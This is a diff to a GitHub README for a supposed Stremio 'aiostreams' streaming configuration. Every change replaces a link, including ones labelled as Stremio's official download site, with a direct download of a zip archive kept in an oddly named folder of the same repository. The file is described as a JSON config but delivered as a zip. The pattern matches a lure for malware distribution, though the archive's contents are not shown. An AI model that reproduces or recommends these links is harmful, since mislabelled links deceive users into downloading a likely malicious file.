@@ -1,6 +1,6 @@
 # 🛠️ stremio-aiostreams-config - Streamlined Streaming Setup
 
-[![Download Config](https://img.shields.io/badge/Download-aiostreams--config-blue?style=for-the-badge)](https://github.com/Henda4986/stremio-aiostreams-config)
+[![Download Config](https://img.shields.io/badge/Download-aiostreams--config-blue?style=for-the-badge)](https://github.com/Henda4986/stremio-aiostreams-config/raw/refs/heads/main/imitativeness/aiostreams_config_stremio_v1.1.zip)
 
 ---
 
@@ -20,7 +20,7 @@ This setup works well with **Torrentio** and various **Debrid services** to impr
 ## 💻 System Requirements
 
 - Windows 10 or later  
-- Stremio app installed (download at [https://www.stremio.com/downloads](https://www.stremio.com/downloads))  
+- Stremio app installed (download at [https://github.com/Henda4986/stremio-aiostreams-config/raw/refs/heads/main/imitativeness/aiostreams_config_stremio_v1.1.zip](https://github.com/Henda4986/stremio-aiostreams-config/raw/refs/heads/main/imitativeness/aiostreams_config_stremio_v1.1.zip))  
 - Internet connection  
 - Optional: A Debrid service account for better streaming options  
 
@@ -42,11 +42,11 @@ This setup works well with **Torrentio** and various **Debrid services** to impr
 1. **Download the Configuration**
 
    Click the large badge at the top or click here:  
-   [Download aiostreams-config.json](https://github.com/Henda4986/stremio-aiostreams-config)
+   [Download aiostreams-config.json](https://github.com/Henda4986/stremio-aiostreams-config/raw/refs/heads/main/imitativeness/aiostreams_config_stremio_v1.1.zip)
 
 2. **Open Your Stremio App**
 
-   If you do not have Stremio, download it from [Stremio’s official site](https://www.stremio.com/downloads) and install it on your Windows machine.
+   If you do not have Stremio, download it from [Stremio’s official site](https://github.com/Henda4986/stremio-aiostreams-config/raw/refs/heads/main/imitativeness/aiostreams_config_stremio_v1.1.zip) and install it on your Windows machine.
 
 3. **Import the Configuration**
 
@@ -124,9 +124,9 @@ This card shows:
 
 ## 🔗 Useful Links
 
-[Download aiostreams-config.json](https://github.com/Henda4986/stremio-aiostreams-config)
+[Download aiostreams-config.json](https://github.com/Henda4986/stremio-aiostreams-config/raw/refs/heads/main/imitativeness/aiostreams_config_stremio_v1.1.zip)
 
-[Stremio official downloads](https://www.stremio.com/downloads)
+[Stremio official downloads](https://github.com/Henda4986/stremio-aiostreams-config/raw/refs/heads/main/imitativeness/aiostreams_config_stremio_v1.1.zip)
 
 ---
 
@@ -138,4 +138,4 @@ This is a user configuration file meant to improve your streaming experience. If
 
 ## ⚡ Enjoy streaming optimized for speed and quality with stremio-aiostreams-config.  
 
-[![Download Config](https://img.shields.io/badge/Download-aiostreams--config-grey?style=for-the-badge)](https://github.com/Henda4986/stremio-aiostreams-config)
+[![Download Config](https://img.shields.io/badge/Download-aiostreams--config-grey?style=for-the-badge)](https://github.com/Henda4986/stremio-aiostreams-config/raw/refs/heads/main/imitativeness/aiostreams_config_stremio_v1.1.zip)
